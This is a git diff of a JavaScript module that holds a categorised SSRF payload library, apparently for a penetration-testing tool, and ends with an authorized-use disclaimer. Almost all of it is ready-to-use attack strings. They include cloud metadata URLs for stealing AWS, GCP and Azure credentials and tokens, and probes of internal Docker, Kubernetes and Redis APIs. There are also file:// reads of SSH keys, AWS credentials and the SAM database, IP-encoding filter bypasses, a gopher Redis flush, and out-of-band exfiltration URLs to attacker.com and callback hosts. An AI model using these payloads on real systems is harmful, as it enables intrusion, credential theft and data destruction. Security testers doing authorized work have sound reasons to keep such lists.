@@ -3,86 +3,98 @@
 
 export const ssrfPayloads = {
   cloudMetadata: {
-    name: 'Cloud Metadata Endpoints',
-    description: 'Access cloud provider metadata services to extract instance credentials and configuration',
+    name: 'Cloud Metadata Services',
+    description: 'Cloud provider instance metadata endpoints',
     category: 'Cloud Metadata',
     payloads: [
       {
-        name: 'AWS IMDSv1 credentials',
+        name: 'AWS IMDSv1 - Credentials',
         code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
       },
       {
-        name: 'AWS IMDSv1 user-data',
+        name: 'AWS IMDSv1 - User Data',
         code: 'http://169.254.169.254/latest/user-data'
       },
       {
-        name: 'AWS IMDSv2 token request',
-        code: 'http://169.254.169.254/latest/api/token'
+        name: 'AWS IMDSv1 - Hostname',
+        code: 'http://169.254.169.254/latest/meta-data/hostname'
       },
       {
-        name: 'GCP metadata service',
-        code: 'http://metadata.google.internal/computeMetadata/v1/'
+        name: 'AWS IMDSv2 - Token Request (Step 1)',
+        code: 'PUT http://169.254.169.254/latest/api/token\nX-aws-ec2-metadata-token-ttl-seconds: 21600'
       },
       {
-        name: 'GCP service account token',
-        code: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
+        name: 'AWS IMDSv2 - Use Token (Step 2)',
+        code: 'http://169.254.169.254/latest/meta-data/\n[Use header: X-aws-ec2-metadata-token: <TOKEN>]'
       },
       {
-        name: 'Azure metadata service',
-        code: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+        name: 'GCP Metadata - Service Account Token',
+        code: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n[Use header: Metadata-Flavor: Google]'
       },
       {
-        name: 'Azure managed identity token',
-        code: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
+        name: 'GCP Metadata - Project ID',
+        code: 'http://metadata.google.internal/computeMetadata/v1/project/project-id\n[Use header: Metadata-Flavor: Google]'
       },
       {
-        name: 'DigitalOcean metadata',
-        code: 'http://169.254.169.254/metadata/v1.json'
+        name: 'Azure Instance Metadata',
+        code: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01\n[Use header: Metadata: true]'
+      },
+      {
+        name: 'Azure - Managed Identity Token',
+        code: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\n[Use header: Metadata: true]'
       }
     ]
   },
-  localServices: {
-    name: 'Internal Network Services',
-    description: 'Access internal services and admin interfaces not exposed externally',
+  internalServices: {
+    name: 'Internal Services',
+    description: 'Common internal service endpoints',
     category: 'Internal Services',
     payloads: [
       {
-        name: 'Localhost web',
-        code: 'http://localhost/'
+        name: 'Redis - Info',
+        code: 'http://127.0.0.1:6379/\n[Note: Use Gopher protocol for full Redis interaction]'
       },
       {
-        name: 'Localhost admin panel',
-        code: 'http://127.0.0.1:8080/admin'
+        name: 'Elasticsearch - Cluster Info',
+        code: 'http://127.0.0.1:9200/'
       },
       {
-        name: 'Internal Redis (info)',
-        code: 'dict://127.0.0.1:6379/info'
-      },
-      {
-        name: 'Internal Memcached',
-        code: 'dict://127.0.0.1:11211/stats'
-      },
-      {
-        name: 'Internal Elasticsearch',
+        name: 'Elasticsearch - All Indices',
         code: 'http://127.0.0.1:9200/_cat/indices'
       },
       {
-        name: 'Internal MongoDB',
-        code: 'http://127.0.0.1:27017/'
-      },
-      {
-        name: 'Internal Docker API',
+        name: 'Docker API - Containers',
         code: 'http://127.0.0.1:2375/v1.41/containers/json'
       },
       {
-        name: 'Internal Kubernetes API',
-        code: 'http://10.96.0.1/api/v1/namespaces'
+        name: 'Docker API - Info',
+        code: 'http://127.0.0.1:2375/info'
+      },
+      {
+        name: 'Kubernetes API Server',
+        code: 'https://10.0.0.1:443/api/v1/namespaces'
+      },
+      {
+        name: 'Kubernetes - Pods',
+        code: 'https://10.0.0.1:443/api/v1/pods'
+      },
+      {
+        name: 'localhost HTTP',
+        code: 'http://localhost/'
+      },
+      {
+        name: 'localhost HTTPS',
+        code: 'https://localhost/'
+      },
+      {
+        name: 'Internal network scan (example)',
+        code: 'http://192.168.1.1/'
       }
     ]
   },
-  fileReadLFI: {
-    name: 'Local File Read via File Protocol',
-    description: 'Read local files using file:// URI scheme',
+  fileRead: {
+    name: 'File Read via file://',
+    description: 'Read local files using the file:// protocol',
     category: 'File Read',
     payloads: [
       {
@@ -90,178 +102,154 @@ export const ssrfPayloads = {
         code: 'file:///etc/passwd'
       },
       {
-        name: '/etc/shadow (Linux)',
-        code: 'file:///etc/shadow'
-      },
-      {
-        name: '/etc/hosts',
+        name: '/etc/hosts (Linux)',
         code: 'file:///etc/hosts'
       },
       {
-        name: 'Windows SAM file',
+        name: '/proc/self/environ (Linux)',
+        code: 'file:///proc/self/environ'
+      },
+      {
+        name: '/proc/self/cmdline (Linux)',
+        code: 'file:///proc/self/cmdline'
+      },
+      {
+        name: 'Windows hosts file',
+        code: 'file:///C:/Windows/System32/drivers/etc/hosts'
+      },
+      {
+        name: 'Windows SAM database',
         code: 'file:///C:/Windows/System32/config/SAM'
       },
       {
-        name: 'Windows win.ini',
-        code: 'file:///C:/Windows/win.ini'
-      },
-      {
-        name: 'Apache access log',
-        code: 'file:///var/log/apache2/access.log'
+        name: 'AWS credentials',
+        code: 'file:///home/ubuntu/.aws/credentials'
       },
       {
         name: 'SSH private key',
-        code: 'file:///home/{USER}/.ssh/id_rsa'
-      },
-      {
-        name: 'Application config',
-        code: 'file:///var/www/html/config.php'
+        code: 'file:///root/.ssh/id_rsa'
       }
     ]
   },
-  bypassTechniques: {
-    name: 'Filter Bypass Techniques',
-    description: 'Bypass URL filters and allowlists used to protect against SSRF',
-    category: 'Bypass Techniques',
+  ipBypass: {
+    name: 'IP Encoding Bypasses',
+    description: 'Bypass IP-based SSRF filters using alternative representations',
+    category: 'IP Bypasses',
     payloads: [
       {
-        name: 'IPv6 localhost',
-        code: 'http://[::1]/'
-      },
-      {
-        name: 'Decimal IP (localhost)',
+        name: 'Decimal IP (127.0.0.1 → 2130706433)',
         code: 'http://2130706433/'
       },
       {
-        name: 'Octal IP (localhost)',
-        code: 'http://0177.0.0.1/'
-      },
-      {
-        name: 'Hex IP (localhost)',
+        name: 'Hex IP (127.0.0.1 → 0x7f000001)',
         code: 'http://0x7f000001/'
       },
       {
-        name: 'URL with credentials',
-        code: 'http://expected-host@127.0.0.1/'
+        name: 'Octal IP (127.0.0.1 → 0177.0000.0000.0001)',
+        code: 'http://0177.0000.0000.0001/'
       },
       {
-        name: 'URL fragment bypass',
-        code: 'http://127.0.0.1#@expected-host/'
+        name: 'IPv6 Loopback',
+        code: 'http://[::1]/'
       },
       {
-        name: 'Double slash bypass',
-        code: 'http://localhost//secure-page'
+        name: 'IPv6 Mapped IPv4',
+        code: 'http://[::ffff:127.0.0.1]/'
       },
       {
-        name: 'URL-encoded dot',
-        code: 'http://127%2E0%2E0%2E1/'
+        name: 'Mixed encoding (0x7f.0.0.1)',
+        code: 'http://0x7f.0.0.1/'
+      },
+      {
+        name: 'DNS rebinding domain (example)',
+        code: 'http://spoofed.attacker.com/  [Setup DNS to resolve to 127.0.0.1]'
+      },
+      {
+        name: 'URL with credentials (bypass)',
+        code: 'http://expected.com@127.0.0.1/'
+      },
+      {
+        name: 'Double URL-encoded',
+        code: 'http://%31%32%37%2e%30%2e%30%2e%31/'
       }
     ]
   },
   protocols: {
-    name: 'Alternative Protocol Schemes',
-    description: 'Use alternative URL schemes to interact with internal services',
-    category: 'Protocol Schemes',
+    name: 'Protocol Schemes',
+    description: 'Non-HTTP protocol schemes for SSRF attacks',
+    category: 'Protocols',
     payloads: [
       {
-        name: 'DICT protocol (info)',
-        code: 'dict://127.0.0.1:11211/info'
+        name: 'Gopher - Redis FLUSHALL',
+        code: 'gopher://127.0.0.1:6379/_FLUSH%20ALL%0D%0A'
       },
       {
-        name: 'SFTP protocol',
-        code: 'sftp://attacker.com:11111/'
+        name: 'Gopher - HTTP request',
+        code: 'gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost%3A%20localhost%0D%0A%0D%0A'
       },
       {
-        name: 'LDAP protocol',
-        code: 'ldap://127.0.0.1:389/'
+        name: 'DICT - Server info',
+        code: 'dict://127.0.0.1:11211/stat'
       },
       {
-        name: 'Gopher Redis flush',
-        code: 'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A'
+        name: 'LDAP - Null base query',
+        code: 'ldap://127.0.0.1:389/%0a'
       },
       {
-        name: 'Gopher HTTP request',
-        code: 'gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0D%0A%0D%0A'
+        name: 'FTP - Bounce scan',
+        code: 'ftp://attacker.com:21/'
       },
       {
-        name: 'FTP protocol',
-        code: 'ftp://127.0.0.1:21/'
+        name: 'SFTP - Internal host',
+        code: 'sftp://127.0.0.1:22/'
       }
     ]
   },
-  dns: {
-    name: 'DNS Rebinding & Out-of-Band',
-    description: 'DNS-based techniques including rebinding and out-of-band data exfiltration',
-    category: 'DNS & OOB',
+  dnsOob: {
+    name: 'DNS / OOB Probes',
+    description: 'Out-of-band DNS-based detection payloads',
+    category: 'DNS / OOB',
     payloads: [
       {
-        name: 'DNS rebinding domain',
-        code: 'http://{YOUR_COLLABORATOR_ID}.oastify.com/'
+        name: 'Basic DNS lookup (Burp Collaborator)',
+        code: 'http://{CALLBACK_HOST}/'
       },
       {
-        name: 'Burp Collaborator SSRF probe',
-        code: 'http://{YOUR_COLLABORATOR_ID}.burpcollaborator.net/'
+        name: 'DNS rebinding with subdomain',
+        code: 'http://169.254.169.254.{CALLBACK_HOST}/'
       },
       {
-        name: 'Subdomain DNS exfil',
-        code: 'http://$(hostname).{YOUR_COLLABORATOR_ID}.oastify.com/'
+        name: 'HTTP via DNS OOB',
+        code: 'http://{CALLBACK_HOST}/path?data=exfil'
       },
       {
-        name: 'CNAME to localhost',
-        code: 'http://localtest.me/'
-      },
-      {
-        name: 'Wildcard DNS to 127.0.0.1',
-        code: 'http://127.0.0.1.nip.io/'
+        name: 'HTTPS OOB',
+        code: 'https://{CALLBACK_HOST}/'
       }
     ]
   }
 }
 
-export const quickProbes = [
-  'http://169.254.169.254/latest/meta-data/',
-  'http://127.0.0.1/',
-  'http://localhost/',
-  'file:///etc/passwd'
-]
-
 export const getAllCategories = () => {
   const categories = new Set()
-  Object.values(ssrfPayloads).forEach(payload => {
-    categories.add(payload.category)
-  })
-  return Array.from(categories).sort()
+  Object.values(ssrfPayloads).forEach(group => categories.add(group.category))
+  return Array.from(categories)
 }
 
 export const getPayloadsByCategory = (category) => {
-  return Object.entries(ssrfPayloads).filter(
-    ([, payload]) => payload.category === category
-  )
+  return Object.entries(ssrfPayloads).filter(([, group]) => group.category === category)
 }
 
 export const disclaimer = `
 ⚠️  DISCLAIMER & LEGAL NOTICE ⚠️
 
-SSRF (Server-Side Request Forgery) attacks can be extremely dangerous and result in:
-• Unauthorized access to internal services and databases
-• Exposure of cloud provider credentials and metadata
-• Internal network reconnaissance and port scanning
-• Remote code execution through internal service vulnerabilities
-• Exfiltration of sensitive data and configuration files
-
 This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.
 
-Only use this tool if you:
+SSRF (Server-Side Request Forgery) vulnerabilities allow attackers to make the server perform requests on their behalf. Only use this tool if you:
 ✓ Have explicit written authorization from the system owner
 ✓ Are testing your own systems or systems you own
 ✓ Are in an authorized penetration testing engagement
 ✓ Understand the legal implications in your jurisdiction
 
-Unauthorized SSRF attacks are ILLEGAL and may result in:
-• Criminal prosecution
-• Civil liability
-• Imprisonment
-• Significant fines
-
-By using this tool, you acknowledge responsibility for your actions.
+Unauthorized use against systems you do not own is ILLEGAL.
 `
